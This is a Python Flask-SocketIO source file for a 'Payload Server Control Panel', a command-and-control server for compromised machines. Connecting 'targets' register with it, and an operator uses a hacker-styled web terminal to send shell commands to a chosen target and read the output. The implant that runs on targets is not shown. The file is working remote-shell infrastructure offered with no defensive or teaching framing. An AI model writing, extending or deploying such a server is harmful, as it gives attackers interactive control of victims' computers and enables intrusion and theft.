#!/usr/bin/env python3
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import os
import subprocess
import datetime
import threading

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*")

# Connected clients store
connected_clients = []
commands_history = []

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Payload Server Control Panel</title>
        <style>
            body { background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }
            .terminal { background: #000; padding: 15px; border-radius: 5px; height: 400px; overflow-y: auto; }
            .input-area { margin-top: 10px; }
            input { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 80%; }
            button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; }
            .status { color: #0f0; }
            .offline { color: #f00; }
        </style>
    </head>
    <body>
        <h2>🔥 Payload Server Active</h2>
        <div id="status">Status: <span class="status">● Online</span></div>
        <div id="clients">Connected Clients: 0</div>
        <div class="terminal" id="terminal"></div>
        <div class="input-area">
            <input type="text" id="cmd" placeholder="Enter command...">
            <button onclick="sendCommand()">Execute</button>
        </div>
        
        <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
        <script>
            var socket = io();
            var clientId = null;
            
            socket.on('connect', function() {
                addToTerminal('[+] Connected to server\\n');
            });
            
            socket.on('client_connected', function(data) {
                clientId = data.id;
                document.getElementById('clients').innerHTML = 'Connected Clients: ' + data.total;
                addToTerminal('[*] Target connected! ID: ' + data.id + '\\n');
            });
            
            socket.on('command_output', function(data) {
                addToTerminal('\\n$> ' + data.output + '\\n');
            });
            
            socket.on('client_disconnected', function() {
                addToTerminal('[-] Target disconnected\\n');
                document.getElementById('clients').innerHTML = 'Connected Clients: 0';
            });
            
            function addToTerminal(text) {
                var term = document.getElementById('terminal');
                term.innerHTML += text;
                term.scrollTop = term.scrollHeight;
            }
            
            function sendCommand() {
                var cmd = document.getElementById('cmd').value;
                if(cmd && clientId) {
                    addToTerminal('\\n[CMD] ' + cmd + '\\n');
                    socket.emit('execute_command', {command: cmd, client_id: clientId});
                    document.getElementById('cmd').value = '';
                }
            }
            
            document.getElementById('cmd').addEventListener('keypress', function(e) {
                if(e.key === 'Enter') sendCommand();
            });
        </script>
    </body>
    </html>
    '''

@socketio.on('connect')
def handle_connect():
    print(f'[+] Client connected: {request.remote_addr}')

@socketio.on('register_client')
def register_client(data):
    client_info = {
        'id': request.sid,
        'ip': request.remote_addr,
        'timestamp': str(datetime.datetime.now())
    }
    connected_clients.append(client_info)
    emit('client_connected', {'id': request.sid, 'total': len(connected_clients)}, broadcast=True)
    print(f'[+] Target registered: {request.sid}')

@socketio.on('command_result')
def handle_result(data):
    print(f'[+] Command output received: {data["output"][:100]}')
    emit('command_output', {'output': data['output']}, room=data.get('listener_id'))

@socketio.on('execute_command')
def execute_command(data):
    # Send command to target
    emit('run_command', {'command': data['command']}, room=data['client_id'])

@socketio.on('disconnect')
def handle_disconnect():
    for client in connected_clients:
        if client['id'] == request.sid:
            connected_clients.remove(client)
            break
    emit('client_disconnected', {'total': len(connected_clients)}, broadcast=True)
    print(f'[-] Client disconnected: {request.sid}')

@app.route('/ping')
def ping():
    return 'OK', 200

@app.route('/api/status')
def status():
    return jsonify({
        'status': 'online',
        'connected_clients': len(connected_clients),
        'timestamp': str(datetime.datetime.now())
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    print(f"""
    ╔══════════════════════════════════════╗
    ║   🚀 WEBSOCKET SERVER READY         ║
    ║   Port: {port}                        ║
    ║   Time: {datetime.datetime.now()}     ║
    ║                                      ║
    ║   Control Panel: http://localhost:{port} ║
    ╚══════════════════════════════════════╝
    """)
    socketio.run(app, host='0.0.0.0', port=port)
